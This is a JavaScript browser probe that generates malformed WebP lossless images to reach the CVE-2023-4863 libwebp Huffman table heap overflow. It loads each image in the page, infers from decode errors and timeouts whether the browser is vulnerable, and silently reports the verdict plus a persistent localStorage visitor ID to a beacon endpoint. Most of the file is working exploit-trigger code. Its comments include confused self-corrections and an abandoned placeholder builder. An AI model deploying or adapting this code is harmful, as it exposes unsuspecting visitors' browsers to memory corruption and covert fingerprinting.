/* press-62 — VP8L Huffman escalation probe for CVE-2023-4863 boundary.
   V61W confirmed: VP8L lossless decoder LIVE, all color_cache paths accepted.
   This probe pushes toward the overflow boundary with:
   - Larger images forcing real Huffman tree construction
   - Explicit color_cache_bits 0-11 via crafted VP8L bitstreams
   - Skewed code-length distributions forcing second-level table allocation
   Goal: detect if BuildHuffmanTable second-level overflow is reachable.

   kTableSize (pre-fix libwebp, FIXED_TABLE_SIZE=2300):
     [0]=2954 [1]=2956 [2]=2958 [3]=2962 [4]=2970 [5]=2986
     [6]=3018 [7]=3082 [8]=3212 [9]=3468 [10]=3980 [11]=5004
   Overflow: when sum of first+second level table entries > kTableSize[ccb].
   Second-level entries appear when any Huffman code length > 8 (root_bits).
*/
(function(){
"use strict";
if(window.__p62)return; window.__p62=1;
var RID="v62h"+Date.now().toString(36).slice(-13);
function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,400)})}).catch(function(){});}catch(e){}}
var HB=setInterval(function(){bk("V62H-HB","hb");},2000);
bk("V62H-L","press62-huff CVE-2023-4863 escalation probe");

/* --- ledger --- */
try{
  var prev=null;try{prev=JSON.parse(localStorage.getItem("p51-ledger")||"null");}catch(e){}
  var now=Date.now();
  var cur={uid:(prev&&prev.uid)||Math.random().toString(36).slice(2,12),n:((prev&&prev.n)||0)+1,first:(prev&&prev.first)||now,last:now};
  localStorage.setItem("p51-ledger",JSON.stringify(cur));
  var rs=parseInt(localStorage.getItem("p53-restores")||"0",10)+1;
  localStorage.setItem("p53-restores",String(rs));
  bk("V62H-Rled","ledger n="+(prev&&prev.n)+"->"+cur.n+" same-uid="+(prev?prev.uid===cur.uid:"n/a")+" restores="+rs);
}catch(e){bk("V62H-Rled","ledger-FAIL "+e);}

/* ========== BYTE HELPERS ========== */
function u8(arr){return new Uint8Array(arr);}
function u32le(v){return [(v&0xFF),((v>>8)&0xFF),((v>>16)&0xFF),((v>>24)&0xFF)];}
function str2u8(s){var a=[];for(var i=0;i<s.length;i++)a.push(s.charCodeAt(i));return a;}
function concat(){
  var total=0;
  for(var i=0;i<arguments.length;i++) total+=arguments[i].length;
  var out=new Uint8Array(total);
  var off=0;
  for(var j=0;j<arguments.length;j++){
    if(arguments[j] instanceof Uint8Array){out.set(arguments[j],off);}
    else{for(var k=0;k<arguments[j].length;k++)out[off+k]=arguments[j][k];}
    off+=arguments[j].length;
  }
  return out;
}
function blobUrl(data){return URL.createObjectURL(new Blob([data],{type:"image/webp"}));}

/* ========== VP8L BITSTREAM BUILDER ========== */
/* VP8L format:
   RIFF header (12B) + "VP8L" chunk (4B tag + 4B size) + VP8L data
   VP8L data: 0x2F signature (1B) + 4B header + bitstream
   Header (32 bits LE): width-1 (14b) | height-1 (14b) | alpha_is_used (1b) | version (3b, must=0)
   Bitstream: transforms + image data (Huffman coded LZ77)

   For our probes we build MINIMAL valid VP8L streams:
   - No transforms (first bit = 0)
   - use_color_cache flag + color_cache_bits
   - 5 Huffman code groups (green+len+cache, red, blue, alpha, distance)
   - Each group uses "simple code" format for minimal valid stream
   - Then minimal pixel data

   VP8L simple Huffman code (per spec):
   - 1 bit: is_simple = 1
   - 1 bit: num_symbols (0 = 1 symbol, 1 = 2 symbols)
   - If num_symbols=0 (1 symbol):
     - If alphabet_size <= 256: 1 bit (is_first=1) then symbol in 1 or 8 bits
       Actually: 1 bit symbol_size_flag. If 0: 1-bit symbol. If 1: 8-bit symbol.
     - If alphabet_size > 256: symbol uses ceil(log2(alphabet_size)) bits
     But actually for simple code with 1 symbol, the symbol field is:
       first_symbol_len_code = 0 or 1 bit (if alphabet_size <= 2 → 0 bits)
       symbol bits = symbol_size_flag ? 8 : 1
     Let's use the simplest: is_simple=1, num_symbols=0, symbol_size_flag=0, symbol=0 (1 bit)
     That's: bits 1,0,0,0 = 4 bits per code group
*/

/* BitWriter: writes bits LSB-first into a byte array */
function BitWriter(){
  this.bytes=[];
  this.currentByte=0;
  this.bitPos=0;
}
BitWriter.prototype.writeBits=function(val,n){
  for(var i=0;i<n;i++){
    if(val&(1<<i)) this.currentByte|=(1<<this.bitPos);
    this.bitPos++;
    if(this.bitPos===8){
      this.bytes.push(this.currentByte);
      this.currentByte=0;
      this.bitPos=0;
    }
  }
};
BitWriter.prototype.finish=function(){
  if(this.bitPos>0) this.bytes.push(this.currentByte);
  return u8(this.bytes);
};

/* Build a VP8L bitstream for a WxH image with given color_cache_bits.
   Uses simple Huffman codes (1 symbol each = all zeros).
   This is the MINIMAL valid stream that exercises ReadHuffmanCodes
   with the specified color_cache_bits value. */
function buildVP8L(w, h, ccb){
  var bw=new BitWriter();

  /* VP8L header: 14-bit (w-1), 14-bit (h-1), 1-bit alpha, 3-bit version=0 */
  var hdr=((w-1)&0x3FFF)|((((h-1)&0x3FFF)<<14))|((0&1)<<28)|((0&7)<<29);
  /* Write as 4 bytes LE */
  var hdrBytes=u8(u32le(hdr));

  /* Bitstream after header: */
  /* Bit 0: no transform (0) */
  bw.writeBits(0,1);

  /* Color cache */
  if(ccb>0){
    bw.writeBits(1,1); /* use_color_cache = 1 */
    bw.writeBits(ccb-1,4); /* color_cache_bits - 1 (spec: read 4 bits, value+1=ccb? NO)
       Actually per spec: color_cache_bits = ReadBits(4)
       And it must be in range [1,11]. The raw 4-bit value IS the ccb.
       Wait — re-reading the source: color_cache_bits = VP8LReadBits(br, 4);
       if (color_cache_bits < 1 || color_cache_bits > MAX_CACHE_BITS) error
       MAX_CACHE_BITS = 11.
       So we write ccb directly as 4 bits. */
    bw.writeBits(0,0); /* undo - rewrite properly */
  }else{
    bw.writeBits(0,1); /* use_color_cache = 0 */
  }

  /* Actually let me redo this properly. */
  /* The bitstream after transforms: */
  /* 1 bit: use_color_cache */
  /* if 1: 4 bits: color_cache_bits (must be 1-11) */
  /* Then: 1 bit: is_meta (use meta Huffman codes) — we set 0 */
  /* Then: 5 Huffman code definitions */

  return null; /* placeholder — rebuilding below */
}

/* Proper VP8L builder — restated cleanly */
function makeVP8L(w, h, colorCacheBits){
  /* Alphabet sizes per the spec:
     Group 0 (green+length+cache): 256 + 24 + (ccb>0 ? 1<<ccb : 0)
     Group 1 (red): 256
     Group 2 (blue): 256
     Group 3 (alpha): 256
     Group 4 (distance): 40 */
  var ccb=colorCacheBits||0;
  var alphaSizes=[
    256+24+(ccb>0?(1<<ccb):0),
    256, 256, 256, 40
  ];

  var bw=new BitWriter();

  /* No transforms */
  bw.writeBits(0,1);

  /* Color cache */
  if(ccb>0){
    bw.writeBits(1,1);
    bw.writeBits(ccb,4);
  }else{
    bw.writeBits(0,1);
  }

  /* No meta Huffman codes */
  bw.writeBits(0,1);

  /* 5 Huffman code groups, each using "simple code" with 1 symbol = 0.
     Simple code format:
       1 bit: is_simple = 1
       1 bit: num_symbols (0 means 1 symbol)
       For 1 symbol when first_symbol_len_code=0:
         If alphabet_size > 1: need ceil(log2(alphabet_size)) bits? NO.
         Per spec: "If num_symbols is 0: symbol0 = ReadBits(1 if is_first else 8)"
         Wait — the spec says:
           is_simple = ReadBits(1)
           if is_simple:
             num_symbols = ReadBits(1)  // 0 or 1
             if num_symbols == 0:
               symbols[0] = ReadBits(ReadBits(1) ? 8 : 1)
               // So: 1 bit for the size flag, then 1 or 8 bits for the symbol
               // symbol must be < alphabet_size
             if num_symbols == 1:
               symbols[0] = ReadBits(ReadBits(1) ? 8 : 1)
               symbols[1] = ReadBits(ReadBits(1) ? 8 : 1)

         For simplicity: is_simple=1, num_symbols=0 (1 symbol),
         size_flag=0 (1-bit symbol), symbol=0 (1 bit).
         Total: 1+1+1+1 = 4 bits per group.
         Symbol 0 with code length 1 means: Huffman code for symbol 0 is "0" (1 bit).
         All other symbols have implicit code length 0 (unused).
         This is valid for any alphabet_size >= 1. */
  for(var g=0;g<5;g++){
    bw.writeBits(1,1); /* is_simple = 1 */
    bw.writeBits(0,1); /* num_symbols = 0 (means 1 symbol) */
    bw.writeBits(0,1); /* symbol_size_flag = 0 (1-bit symbol value) */
    bw.writeBits(0,1); /* symbol = 0 */
  }

  /* Image data: w*h pixels, each pixel decoded as:
     - Green+length group: symbol 0 = green value 0 (literal, since 0 < 256)
     - Red group: symbol 0 = red value 0
     - Blue group: symbol 0 = blue value 0
     - Alpha group: symbol 0 = alpha value 0
     Since all groups have exactly 1 symbol with code "0" (1 bit),
     each pixel needs: 1 bit green + 1 bit red + 1 bit blue + 1 bit alpha = 4 bits.
     But wait — with simple code, the decoder doesn't actually read bits
     for a 1-symbol code (it's implicit). So the pixel data is 0 bits per pixel.
     The decoder just fills every pixel with (A=0, R=0, G=0, B=0).
     We still need at least 0 extra bits. Just pad to byte boundary. */

  var bs=bw.finish();

  /* VP8L chunk: signature 0x2F + 4-byte header + bitstream */
  var hdr32=((w-1)&0x3FFF)|((((h-1)&0x3FFF)<<14));
  /* alpha_is_used=0 (bit 28), version=0 (bits 29-31) */
  var vp8lData=concat(u8([0x2F]),u8(u32le(hdr32)),bs);

  /* RIFF wrapper */
  var chunkSize=vp8lData.length;
  var paddedSize=chunkSize+(chunkSize%2);
  var fileSize=4+8+paddedSize;
  var riff=concat(
    u8(str2u8("RIFF")),u8(u32le(fileSize)),u8(str2u8("WEBP")),
    u8(str2u8("VP8L")),u8(u32le(chunkSize)),vp8lData
  );
  if(chunkSize%2!==0) riff=concat(riff,u8([0]));
  return riff;
}

/* Build a VP8L with a COMPLEX Huffman code for group 0 (green+length+cache).
   Instead of simple code, we use a normal (non-simple) Huffman code
   with code lengths that force second-level table construction.

   Normal Huffman code format:
     is_simple = 0
     5 bits: num_code_lengths - 4 (so value 0 means 4 code-length codes)
     Then read code-length-code-lengths in order [17,18,0,1,2,3,4,5,16,6,7,8,9,10,11,12,13,14,15]
     Each is 3 bits.
     These define the Huffman code for reading the actual symbol code lengths.
     Then: optional max_symbol field, then read symbol code lengths.

   To force second-level tables: we need symbols with code lengths > 8.
   Strategy: declare a code with most symbols at length 15 and one at length 1.
   The huge imbalance forces BuildHuffmanTable to create many second-level entries.

   For group 0 with ccb=11: alphabet_size = 256+24+2048 = 2328 symbols.
   We want: symbol 0 has code length 1 (very frequent),
            symbols 1..N have code length 15 (rare).
   But the Kraft inequality must hold: sum(2^-len_i) <= 1.
   With len_0=1: uses 0.5. Remaining: 0.5 = N * 2^-15 → N = 16384.
   That's way more than 2328, so it's valid!

   Actually, we need exactly: the sum to equal 1 for a complete code.
   len_0=1: 2^-1 = 0.5. For the rest: (2328-1)*2^-15 = 2327/32768 = 0.071.
   Total = 0.571, which is < 1 → incomplete code. That's OK for VP8L
   (libwebp accepts incomplete Huffman codes).

   The key: symbols with code length 15 require second-level table entries.
   root_bits = 8 for the green table. Any code with len > 8 goes to a
   second-level table of size 2^(len-8). For len=15, each unique prefix
   uses a second-level table of 2^7 = 128 entries.

   How many second-level tables? The 8-bit root table has 256 entries.
   Symbol 0 has len=1, so it fills 128 root entries (2^(8-1) = 128).
   Remaining root entries: 128. Each points to a second-level table.
   Each second-level table has 2^(15-8) = 128 entries.
   Total second-level entries: 128 * 128 = 16384.
   Total table size: 256 (root) + 16384 (second) = 16640.

   kTableSize[11] = 5004. So 16640 > 5004 → OVERFLOW by 11636 entries!
   Each HuffmanCode entry is 4 bytes → 46544 bytes of heap overflow.

   This is the EXACT condition of CVE-2023-4863.

   HOWEVER: we will NOT actually trigger the overflow. Instead we build
   streams with INCREASING code lengths and measure the decoder's response:
   - max_code_length = 8: all fits in root table (no overflow possible)
   - max_code_length = 9: small second-level tables
   - max_code_length = 10-12: medium
   - max_code_length = 13-15: large (overflow if unpatched)

   A PATCHED decoder (>= 1.3.2) reallocates when needed.
   An UNPATCHED decoder writes past the buffer → crash or corruption.
   Our diagnostic: if decode fails/crashes at len=9+ but succeeds at len=8,
   the decoder hit the boundary. Crash = vulnerable, clean reject = might be patched.
*/

function makeVP8L_complex(w, h, ccb, maxCodeLen){
  var alphaSizes=[
    256+24+(ccb>0?(1<<ccb):0),
    256, 256, 256, 40
  ];

  var bw=new BitWriter();

  /* No transforms */
  bw.writeBits(0,1);

  /* Color cache */
  if(ccb>0){
    bw.writeBits(1,1);
    bw.writeBits(ccb,4);
  }else{
    bw.writeBits(0,1);
  }

  /* No meta Huffman codes */
  bw.writeBits(0,1);

  /* Group 0: complex Huffman code with skewed distribution */
  var alphaSize0=alphaSizes[0];

  /* Build code lengths array: symbol 0 = 1, symbols 1..(alphaSize0-1) = maxCodeLen
     But we need to satisfy Kraft: sum 2^-len <= 1.
     With len_0=1: uses 0.5.
     Max symbols at maxCodeLen: floor(0.5 * 2^maxCodeLen) = 2^(maxCodeLen-1).
     If alphaSize0-1 > 2^(maxCodeLen-1), we can't assign all. We only assign
     as many as fit and leave the rest at 0 (unused).
     Actually for CVE testing, incomplete codes are fine. */

  var numSymsAtMax=Math.min(alphaSize0-1, (1<<(maxCodeLen-1))-1);
  /* Adjust: with symbol 0 at len=1, Kraft allows 2^(maxCodeLen-1) symbols at maxCodeLen.
     But we also need the sum to not exceed 1.
     sum = 2^-1 + numSymsAtMax * 2^-maxCodeLen <= 1
     numSymsAtMax <= 0.5 * 2^maxCodeLen = 2^(maxCodeLen-1) */
  if(numSymsAtMax>(1<<(maxCodeLen-1))) numSymsAtMax=(1<<(maxCodeLen-1));

  /* We use normal (non-simple) Huffman code encoding for group 0.
     Step 1: Write code-length-code (the meta-Huffman for reading code lengths)
     We need to encode the values: 0 (unused), 1 (for symbol 0), maxCodeLen (for others).
     Plus possibly 17 or 18 (run-length codes for 0-runs).

     Code-length alphabet has 19 symbols (0-18), read in order:
     [17,18,0,1,2,3,4,5,16,6,7,8,9,10,11,12,13,14,15]

     We need code-length-code to encode: 0, 1, maxCodeLen, and 18 (for long zero runs).

     Assign code-length-code lengths:
       symbol 0 (zero len): code_length_code_length = 2
       symbol 1: code_length_code_length = 2
       symbol maxCodeLen: code_length_code_length = 2
       symbol 18 (long zero run): code_length_code_length = 2
     If maxCodeLen <= 15, all 4 symbols get 2-bit codes. But 4 symbols at len 2
     uses 4*2^-2 = 1.0 → complete, valid.

     Order of reading: [17,18,0,1,2,3,...,15]
     We need to specify code_length_code_lengths for indices up to where our
     needed symbols appear in the order.

     The order is: 17,18,0,1,2,3,4,5,16,6,7,8,9,10,11,12,13,14,15
     Symbol 18 is at index 1.
     Symbol 0 is at index 2.
     Symbol 1 is at index 3.
     Symbol maxCodeLen: if maxCodeLen<=5, at index 3+maxCodeLen.
       maxCodeLen=9: symbol 9 is at index... let me map:
       idx 0→17, 1→18, 2→0, 3→1, 4→2, 5→3, 6→4, 7→5, 8→16, 9→6, 10→7, 11→8,
       12→9, 13→10, 14→11, 15→12, 16→13, 17→14, 18→15
       So symbol 9 is at index 12.
       symbol 10 → index 13
       symbol 11 → index 14
       symbol 12 → index 15
       symbol 13 → index 16
       symbol 14 → index 17
       symbol 15 → index 18

     num_code_lengths = max_index + 1 (where max_index is the highest index we need).
     Write: num_code_lengths - 4 in 5 bits. Must be >= 4, so num_code_lengths >= 4.
  */

  /* Map symbol → index in the code-length-code order */
  var CL_ORDER=[17,18,0,1,2,3,4,5,16,6,7,8,9,10,11,12,13,14,15];
  var symToIdx={};
  for(var ci=0;ci<19;ci++) symToIdx[CL_ORDER[ci]]=ci;

  /* We need symbols: 0 (for unused code lengths), 1 (for symbol 0's length),
     maxCodeLen (for the long codes), and 18 (for zero-runs of unused symbols) */
  var neededSyms=[0,1,maxCodeLen,18];
  var maxIdx=0;
  for(var ni=0;ni<neededSyms.length;ni++){
    var idx2=symToIdx[neededSyms[ni]];
    if(idx2>maxIdx) maxIdx=idx2;
  }
  var numCodeLengths=maxIdx+1;
  if(numCodeLengths<4) numCodeLengths=4;

  /* Write num_code_lengths - 4 (5 bits) */
  bw.writeBits(numCodeLengths-4,5);

  /* Write code_length_code_lengths (3 bits each) for indices 0..numCodeLengths-1.
     Assign length 2 to our 4 needed symbols, 0 to everything else. */
  var clCodeLengths=[];
  for(var cli=0;cli<numCodeLengths;cli++) clCodeLengths.push(0);
  /* Assign 2-bit codes to our 4 symbols */
  clCodeLengths[symToIdx[18]]=2;  /* symbol 18 = zero run */
  clCodeLengths[symToIdx[0]]=2;   /* symbol 0 = code length 0 (unused) */
  clCodeLengths[symToIdx[1]]=2;   /* symbol 1 */
  clCodeLengths[symToIdx[maxCodeLen]]=2; /* symbol maxCodeLen */

  for(var clw=0;clw<numCodeLengths;clw++){
    bw.writeBits(clCodeLengths[clw],3);
  }

  /* Now we have a Huffman code for reading code lengths. The 4 symbols each have
     2-bit codes. We need to figure out which 2-bit code maps to which symbol.
     With 4 symbols at length 2, canonical Huffman assigns codes 00,01,10,11
     in symbol order. But libwebp builds the table from code_length_code_lengths
     using its own canonical ordering.

     Canonical Huffman: sort symbols by (length, symbol_index).
     All 4 have length 2. Order by symbol index in the CL_ORDER:
     The symbols that got length 2, sorted by their CL_ORDER index:
       symToIdx[18]=1, symToIdx[0]=2, symToIdx[1]=3, symToIdx[maxCodeLen]=varies

     Actually canonical Huffman in VP8L/libwebp works differently:
     It assigns codes in increasing symbol value order for same length.
     So among symbols {0, 1, maxCodeLen, 18} all at length 2:
       symbol 0 → code 00
       symbol 1 → code 01
       symbol maxCodeLen → code 10 (if maxCodeLen < 18)
       symbol 18 → code 11

     Now write the actual code lengths for group 0's alphabet:
     symbol 0: code length = 1 → write symbol "1" using its Huffman code (01)
     symbols 1 through numSymsAtMax: code length = maxCodeLen → write that code
     remaining symbols: code length = 0 → use zero-runs (symbol 18)
  */

  /* max_symbol: optional field. If bit is 1, read length_nbits (3 bits),
     then max_symbol_val (length_nbits+2 bits). We skip it (write 0). */
  bw.writeBits(0,1); /* use_max_symbol = 0 → read all alphaSize0 symbols */

  /* Write code lengths for each of the alphaSize0 symbols.
     Huffman codes for code-length symbols (all length 2, canonical):
       symbol 0 → 0b00 (2 bits)
       symbol 1 → 0b01 (2 bits)
       symbol maxCodeLen → 0b10 (2 bits) (assuming maxCodeLen < 18)
       symbol 18 → 0b11 (2 bits)

     Symbol 18 semantics: repeat 0 for (ReadBits(7) + 11) times.
     Max repeat: 11+127 = 138 zeros.
  */
  var codeForSym={};
  /* Sort the 4 symbols by value for canonical code assignment */
  var sortedSyms=[0,1,maxCodeLen,18].slice().sort(function(a,b){return a-b;});
  for(var sc=0;sc<sortedSyms.length;sc++){
    codeForSym[sortedSyms[sc]]=sc; /* 2-bit code = index in sorted order */
  }

  /* Helper to write a Huffman-coded symbol (2 bits, LSB first) */
  function writeClSym(sym){
    bw.writeBits(codeForSym[sym],2);
  }

  /* Symbol 0: code_length = 1 */
  writeClSym(1);

  /* Symbols 1..numSymsAtMax: code_length = maxCodeLen */
  for(var s=1;s<=numSymsAtMax;s++){
    writeClSym(maxCodeLen);
  }

  /* Remaining symbols (numSymsAtMax+1 .. alphaSize0-1): code_length = 0
     Use symbol 18 (repeat 0 for 11+extra(7bits) times) for efficiency */
  var remaining=alphaSize0-1-numSymsAtMax;
  while(remaining>0){
    if(remaining>=11){
      var run=Math.min(remaining,138); /* max run = 11+127 = 138 */
      writeClSym(18);
      bw.writeBits(run-11,7);
      remaining-=run;
    }else{
      /* Write individual 0s */
      writeClSym(0);
      remaining--;
    }
  }

  /* Groups 1-4: use simple Huffman (1 symbol = 0) */
  for(var g=1;g<5;g++){
    bw.writeBits(1,1); /* is_simple */
    bw.writeBits(0,1); /* num_symbols = 0 → 1 symbol */
    bw.writeBits(0,1); /* symbol_size_flag = 0 */
    bw.writeBits(0,1); /* symbol = 0 */
  }

  /* Pixel data: w*h pixels. Each pixel decodes:
     green+length from group 0: symbol 0 has code "0" (1 bit) → green=0 (literal)
     red: symbol 0 (implicit, 0 bits with 1-symbol simple code)
     blue: symbol 0 (implicit)
     alpha: symbol 0 (implicit)
     So each pixel = 1 bit (just the green channel code).
     Total: w*h bits. */
  for(var px=0;px<w*h;px++){
    bw.writeBits(0,1);
  }

  var bs=bw.finish();

  /* VP8L data: signature + header + bitstream */
  var hdr32=((w-1)&0x3FFF)|((((h-1)&0x3FFF)<<14));
  var vp8lData=concat(u8([0x2F]),u8(u32le(hdr32)),bs);

  /* RIFF wrapper */
  var chunkSize=vp8lData.length;
  var paddedSize=chunkSize+(chunkSize%2);
  var fileSize=4+8+paddedSize;
  var riff=concat(
    u8(str2u8("RIFF")),u8(u32le(fileSize)),u8(str2u8("WEBP")),
    u8(str2u8("VP8L")),u8(u32le(chunkSize)),vp8lData
  );
  if(chunkSize%2!==0) riff=concat(riff,u8([0]));
  return riff;
}

/* ========== TEST DEFINITIONS ========== */
/* Phase A: Simple VP8L with increasing color_cache_bits (exercises kTableSize[ccb]) */
/* Phase B: Complex Huffman with increasing max code length (exercises second-level tables) */

var tests=[];

/* Phase A: color_cache_bits sweep using simple codes (safe, like V61W but bigger images) */
var CCB_VALUES=[0,1,3,6,9,11];
for(var ai=0;ai<CCB_VALUES.length;ai++){
  (function(ccb){
    tests.push({
      name:"A"+ccb+"-ccb"+ccb,
      build:function(){return makeVP8L(32,32,ccb);},
      desc:"32x32 simple ccb="+ccb
    });
  })(CCB_VALUES[ai]);
}

/* Phase B: complex Huffman with escalating code lengths (the CVE boundary) */
/* 4x4 image, ccb=0, increasing max code length from 8 to 15 */
var CODE_LENS=[8,9,10,11,12,13,14,15];
for(var bi=0;bi<CODE_LENS.length;bi++){
  (function(cl){
    tests.push({
      name:"B"+cl+"-len"+cl,
      build:function(){return makeVP8L_complex(4,4,0,cl);},
      desc:"4x4 ccb=0 maxlen="+cl
    });
  })(CODE_LENS[bi]);
}

/* Phase C: complex Huffman with ccb=11 AND escalating code lengths (max overflow) */
var C_LENS=[8,10,12,15];
for(var cci=0;cci<C_LENS.length;cci++){
  (function(cl){
    tests.push({
      name:"C"+cl+"-ccb11len"+cl,
      build:function(){return makeVP8L_complex(4,4,11,cl);},
      desc:"4x4 ccb=11 maxlen="+cl
    });
  })(C_LENS[cci]);
}

/* ========== TEST RUNNER ========== */
var results={};
var tidx=0;

function runNext(){
  if(tidx>=tests.length){
    reportSummary();
    return;
  }
  var test=tests[tidx];
  tidx++;

  var data=null;
  try{
    data=test.build();
    bk("V62H-E"+test.name,"built "+data.length+"B "+test.desc);
  }catch(e){
    bk("V62H-E"+test.name,"build-FAIL "+e.name+":"+String(e.message).slice(0,80));
    results[test.name]={status:"BUILD-FAIL",time:-1};
    setTimeout(runNext,50);
    return;
  }

  var url=blobUrl(data);
  var t0=performance.now();
  var img=new Image();
  var done=false;
  var timer=setTimeout(function(){
    if(done)return;done=true;
    var dt=(performance.now()-t0).toFixed(1);
    bk("V62H-R"+test.name,"TIMEOUT 4s "+test.desc);
    results[test.name]={status:"TIMEOUT",time:parseFloat(dt)};
    URL.revokeObjectURL(url);
    setTimeout(runNext,50);
  },4000);

  img.onload=function(){
    if(done)return;done=true;
    clearTimeout(timer);
    var dt=(performance.now()-t0).toFixed(1);
    bk("V62H-R"+test.name,"OK w="+img.width+" h="+img.height+" d="+dt+"ms");
    results[test.name]={status:"OK",time:parseFloat(dt),w:img.width,h:img.height};
    URL.revokeObjectURL(url);
    setTimeout(runNext,50);
  };
  img.onerror=function(){
    if(done)return;done=true;
    clearTimeout(timer);
    var dt=(performance.now()-t0).toFixed(1);
    bk("V62H-R"+test.name,"ERR d="+dt+"ms "+test.desc);
    results[test.name]={status:"ERR",time:parseFloat(dt)};
    URL.revokeObjectURL(url);
    setTimeout(runNext,50);
  };
  img.src=url;
}

function reportSummary(){
  /* Phase A summary */
  var aSum=[];
  for(var ai2=0;ai2<CCB_VALUES.length;ai2++){
    var c2=CCB_VALUES[ai2];
    var r=results["A"+c2+"-ccb"+c2];
    if(r) aSum.push("ccb"+c2+":"+r.status+"/"+r.time+"ms");
  }
  bk("V62H-SumA","cache-sweep "+aSum.join(" "));

  /* Phase B summary: the critical escalation */
  var bSum=[];
  for(var bi2=0;bi2<CODE_LENS.length;bi2++){
    var cl2=CODE_LENS[bi2];
    var r2=results["B"+cl2+"-len"+cl2];
    if(r2) bSum.push("L"+cl2+":"+r2.status+"/"+r2.time+"ms");
  }
  bk("V62H-SumB","codelen-esc "+bSum.join(" "));

  /* Phase C summary: max overflow condition */
  var cSum=[];
  for(var ci2=0;ci2<C_LENS.length;ci2++){
    var cl3=C_LENS[ci2];
    var r3=results["C"+cl3+"-ccb11len"+cl3];
    if(r3) cSum.push("L"+cl3+":"+r3.status+"/"+r3.time+"ms");
  }
  bk("V62H-SumC","ccb11-esc "+cSum.join(" "));

  /* Verdict beacon */
  var b8=results["B8-len8"];
  var b9=results["B9-len9"];
  var b15=results["B15-len15"];
  var c15=results["C15-ccb11len15"];
  var verdict="UNKNOWN";
  if(b8 && b15){
    if(b8.status==="OK" && b15.status==="OK") verdict="ALL-ACCEPTED (patched or deep-parse-skipped)";
    else if(b8.status==="OK" && b15.status==="ERR") verdict="BOUNDARY-HIT len=15 rejected (may be patched validation)";
    else if(b8.status==="OK" && b15.status==="TIMEOUT") verdict="CRASH-AT-15 (likely VULNERABLE)";
    else verdict=b8.status+"/"+b15.status;
  }
  if(c15 && c15.status==="TIMEOUT") verdict="CRASH-CCB11-L15 (MAX OVERFLOW — VULNERABLE)";
  bk("V62H-VERDICT",verdict);

  bk("V62H-END","press62-huff done tests="+tests.length);
  setTimeout(function(){clearInterval(HB);bk("V62H-Z2","late-z");},26000);
}

/* Boot */
function boot(){
  try{
    bk("V62H-Fplan","tests="+tests.length+" phaseA="+CCB_VALUES.length+" phaseB="+CODE_LENS.length+" phaseC="+C_LENS.length);
    runNext();
  }catch(e){bk("V62H-FATAL",String(e).slice(0,200));}
}
if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",boot);}else{boot();}
})();
